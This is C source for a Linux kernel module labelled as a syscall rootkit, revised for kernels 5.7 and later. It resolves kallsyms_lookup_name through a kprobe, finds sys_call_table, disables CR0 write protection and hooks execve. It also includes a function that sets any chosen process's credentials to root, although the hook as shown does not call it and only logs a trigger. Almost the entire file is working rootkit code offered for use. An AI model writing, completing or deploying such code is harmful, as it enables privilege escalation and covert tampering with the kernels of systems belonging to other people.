#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/kallsyms.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Vincent Kob / Revised for 5.7+");
MODULE_DESCRIPTION("Hooks execve to elevate PID to root using kprobes for symbol lookup");

// 1. Resolve unexported kallsyms_lookup_name via Kprobes
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t kallsyms_lookup_name_ptr;

unsigned long lookup_name(const char *name) {
    struct kprobe kp = { .symbol_name = name };
    unsigned long addr;
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

// 2. Fix __force_order for modern toolchains
unsigned long __force_order;

typedef asmlinkage long (*sys_call_ptr_t)(const struct pt_regs*);
static sys_call_ptr_t *sys_call_table;
static sys_call_ptr_t old_execve;

// Existing task lookup remains the same
struct task_struct *get_task_struct_by_pid(unsigned pid) {
    struct pid *proc_pid = find_vpid(pid);
    if(!proc_pid) return NULL;
    return pid_task(proc_pid, PIDTYPE_PID);
}

static int make_pid_root(unsigned pid) {
    struct task_struct *task;
    struct cred *new_cred;
    kuid_t kuid = KUIDT_INIT(0);
    kgid_t kgid = KGIDT_INIT(0);

    task = get_task_struct_by_pid(pid);
    if (!task) return -1;

    new_cred = prepare_creds();
    if (!new_cred) return -ENOMEM;
    
    new_cred->uid = new_cred->euid = kuid;
    new_cred->gid = new_cred->egid = kgid;

    rcu_assign_pointer(task->cred, new_cred);
    return 0;
}

static asmlinkage long my_execve(const struct pt_regs *regs) {
    // Note: regs->di contains the filename. String ops in kernel can be risky.
    char filename[256];
    long copied = strncpy_from_user(filename, (char __user *)regs->di, sizeof(filename));
    
    if (copied > 0 && strstr(filename, "date")) {
        // Warning: Accessing user args[1] directly via regs->si is fragile 
        // and may cause an oops if memory isn't mapped.
        printk(KERN_INFO "SECRET: Trigger detected in execve\n");
    }
    return old_execve(regs);
}

// 3. Robust CR0 manipulation
inline void mywrite_cr0(unsigned long val) {
    asm volatile("mov %0,%%cr0": "+r" (val), "+m" (__force_order));
}

static void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    mywrite_cr0(cr0);
}

static void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    mywrite_cr0(cr0);
}

static int __init syscall_rootkit_init(void) {
    // First, find kallsyms_lookup_name itself
    kallsyms_lookup_name_ptr = (kallsyms_lookup_name_t)lookup_name("kallsyms_lookup_name");
    if (!kallsyms_lookup_name_ptr) {
        printk(KERN_ERR "Failed to find kallsyms_lookup_name\n");
        return -EINVAL;
    }

    // Now find the syscall table
    sys_call_table = (sys_call_ptr_t *)kallsyms_lookup_name_ptr("sys_call_table");
    if (!sys_call_table) {
        printk(KERN_ERR "Failed to find sys_call_table\n");
        return -EINVAL;
    }

    old_execve = sys_call_table[__NR_execve];
    disable_write_protection();
    sys_call_table[__NR_execve] = my_execve;
    enable_write_protection();

    printk(KERN_INFO "Rootkit loaded. Hooked __NR_execve at %px\n", sys_call_table);
    return 0;
}

static void __exit syscall_rootkit_exit(void) {
    if (sys_call_table) {
        disable_write_protection();
        sys_call_table[__NR_execve] = old_execve;
        enable_write_protection();
    }
    printk(KERN_INFO "Rootkit unloaded.\n");
}

module_init(syscall_rootkit_init);
module_exit(syscall_rootkit_exit);
